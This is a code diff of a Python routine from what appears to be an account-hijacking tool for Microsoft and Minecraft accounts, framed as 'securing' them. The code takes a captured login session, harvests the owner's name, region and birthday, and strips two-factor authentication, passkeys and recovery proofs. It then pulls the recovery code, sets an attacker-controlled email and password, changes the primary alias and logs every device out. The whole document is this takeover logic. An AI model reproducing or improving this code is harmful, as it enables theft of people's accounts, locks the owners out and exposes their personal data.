@@ -1,46 +1,45 @@
 from views.utils.securing.securityInformation import securityInformation
-from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
 from views.utils.securing.changePrimaryAlias import changePrimaryAlias
 from views.utils.minecraft.getNamechange import getUsernameInfo
 from views.utils.securing.getRecoveryCode import getRecoveryCode
 from views.utils.securing.removeServices import removeServices
 from views.utils.securing.generateEmail import generateEmail
+from views.utils.securing.getOwnerInfo import getOwnerInfo
 from views.utils.securing.removeProof import removeProof
 from views.utils.securing.removeZyger import removeZyger
 from views.utils.securing.getCookies import getCookies
-from views.utils.securing.polishHost import polishHost
 from views.utils.securing.getProfile import getProfile
 from views.utils.securing.remove2FA import remove2FA
 from views.utils.securing.logoutAll import logoutAll
+from views.utils.securing.recovery import recover
 from views.utils.securing.getAMRP import getAMRP
 from views.utils.securing.getSSID import getSSID
+from views.utils.securing.getAMC import getAMC
 from views.utils.securing.getT import getT
 
 from views.utils.minecraft.getMethod import getMethod
 from views.utils.minecraft.getCapes import getCapes
 from views.utils.minecraft.getXBL import getXBL
 
+from database.database import DBConnection
+import httpx
 import uuid
 import json
 
 ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
+database = DBConnection()
 
-async def secure(msaauth: str):
+async def secure(session: httpx.AsyncClient):
 
-    apicanary, amsc = await getCookies() 
+    apicanary = await getCookies(session) 
 
-    print("[+] - Got Cookies! Polishing login cookie...")
-    host = await polishHost(msaauth, amsc)
-    print(f"MSAAUTH: {host}")
     accountInfo = {
         "oldName": "Failed to Get",
         "newName": "Couldn't Change!",
         "email": "Couldn't Change!",
-        "oldEmail": "Couldn't Change",
         "secEmail": "Couldn't Change!",
         "password": "Couldn't Change!",
         "recoveryCode": "Couldn't Change!",
-        "loginCookie": host,
         "status": "Unknown",
         "SSID": False,
         "firstName": "Failed to Get",
@@ -52,26 +51,30 @@ async def secure(msaauth: str):
         "capes": "No capes"
     }
     
-    t = await getT(host, amsc)
+    T = await getT(session)
 
     # This means the account hasn't accepted TOS (To be fixed asap)
-    if not t:
-
+    if not T:
         print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
-        
-        # accountInfo["email"] = "Microsoft Down"
-        # accountInfo["secEmail"] = "Microsoft Down"
-        # accountInfo["recoveryCode"] = "Microsoft Down"
-        # accountInfo["password"] = "Microsoft Down"
-        # accountInfo["status"] = "Microsoft Down"
-
         return accountInfo
     
     print("[+] - Found T")
+
+    verificationToken = await getAMC(session)
+    ownerInfo = await getOwnerInfo(session, verificationToken)
+
+    if ownerInfo:
+        print("[+] - Got Owner Info")
+        
+        accountInfo["firstName"] = ownerInfo["Fname"]
+        accountInfo["lastName"] = ownerInfo["Lname"]
+        accountInfo["region"] = ownerInfo["region"]
+        accountInfo["birthday"] = ownerInfo["birthday"]
+        accountInfo["fullName"] = f"{ownerInfo["Fname"]} {ownerInfo["Lname"]}"
     
     # Minecraft checking
     print("[~] - Checking Minecraft Account")
-    XBLResponse = await getXBL(host)
+    XBLResponse = await getXBL(session)
 
     if XBLResponse:
         print("[+] - Got XBL (Has Xbox Profile)")
@@ -120,87 +123,75 @@ async def secure(msaauth: str):
         accountInfo["oldName"] = "No Minecraft"
 
     # Security Steps
-    amrp = await getAMRP(t, amsc)
-    if amrp:
+    await getAMRP(session, T)
+    print("[+] - Got AMRP")
+
+    # 2FA
+    await remove2FA(session, apicanary)
+
+    # Pass Keys / Windows Hello Exploit
+    await removeZyger(session, apicanary)
+
+    # Removes secEmails / Auth Apps
+    await removeProof(session, apicanary)
+    print("[+] - Removed all Proofs")
+    
+    # Third Partie Launchers (Minecraft, Prism)
+    await removeServices(session)   
+
+    securityParameters = json.loads(await securityInformation(session))
+    print("[+] - Got Security Parameters")
+    
+    if securityParameters:
         
-        print("[+] - Got AMRP")
-
-        # 2FA
-        await remove2FA(amrp, apicanary, amsc)
-
-        # Pass Keys / Windows Hello
-        await removeZyger(amrp, apicanary, amsc)
-
-        # Removes secEmails / Auth Apps
-        await removeProof(amrp, apicanary, amsc)
-        print("[+] - Removed all Proofs")
+        # Original Email
+        mainEmail = securityParameters["email"]
+        encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
         
-        # Third Partie Launchers (Minecraft, Prism)
-        await removeServices(amrp, amsc)          
+        recoveryCode = await getRecoveryCode(
+            session,
+            apicanary,
+            encryptedNetID
+        )
+        print(f"[+] - Got Recovery Code | {recoveryCode}")
 
-        # accountMSInfo = getAccountInfo()
+        secEmail = uuid.uuid4().hex[:16]
+        newPassword = uuid.uuid4().hex[:12]
 
-        # accountInfo["firstName"] = accountMSInfo["firstName"]
-        # accountInfo["lastName"] = accountMSInfo["lastName"]
-        # accountInfo["fullName"] = accountMSInfo["fullName"]
-        # accountInfo["region"] = accountMSInfo["region"]
-        # accountInfo["birthday"] = accountMSInfo["birthday"]
+        emailToken, secEmail = await generateEmail(secEmail, newPassword)
 
-        # print("[+] - Got Account Information")
-
-        securityParameters = json.loads(await securityInformation(amrp))
-        print("[+] - Got Security Parameters")
+        print(f"[+] - Generated Security Email ({secEmail})")
+        database.addEmail(secEmail, newPassword)
         
-        if securityParameters:
-            
-            # Original Email
-            sEmail = securityParameters["email"]
-            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
-            
-            recoveryCode = await getRecoveryCode(
-                amrp,
-                apicanary,
-                amsc,
-                encryptedNetID
-            )
-            print(f"[+] - Got Recovery Code | {recoveryCode}")
+        print("[~] - Automaticly Securing Account...")
+        newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken) 
 
-            secEmail = uuid.uuid4().hex[:16]
-            newPassword = uuid.uuid4().hex[:12]
+        if newData:
+            accountInfo["secEmail"] = secEmail
+            accountInfo["recoveryCode"] = newData
+            accountInfo["password"] = newPassword
+        else:
+            print(f"[X] - Failed to secure this account")
+        
+        if ralias:
 
-            secEmail, emailToken = await generateEmail(secEmail, newPassword)
+            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
+            print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
 
-            print("[~] - Automaticly Securing Account...")
-            newData = await recoveryCodeSecure(sEmail, recoveryCode, secEmail, newPassword, emailToken) 
+            info = await changePrimaryAlias(session, primaryEmail, apicanary)
 
-            if newData:
-
-                accountInfo["secEmail"] = secEmail
-                accountInfo["recoveryCode"] = newData
-                accountInfo["password"] = newPassword
-
-            else:
-
-                print(f"[X] - Failed to secure this account")
-            
-            if ralias:
-
-                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-                print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
-                await changePrimaryAlias(primaryEmail, amrp, apicanary, amsc)
-
-                print(f"[+] - Changed Primary Alias)")
+            if info:
                 accountInfo["email"] = f"{primaryEmail}@outlook.com"
-                accountInfo["oldEmail"] = sEmail
-            
+                print(f"[+] - Changed Primary Alias")
             else:
-                
-                accountInfo["oldEmail"] = sEmail
-                accountInfo["email"] = sEmail
-            
-        # Logout all devices
-        await logoutAll(amrp, apicanary, amsc)
-        print("[+] - Account has been secured")
+                accountInfo["email"] = mainEmail
+
+        else:
+            accountInfo["email"] = mainEmail
+        
+    # Logout all devices
+    await logoutAll(session, apicanary)
+    print("[+] - Account has been secured")
 
     return accountInfo
 
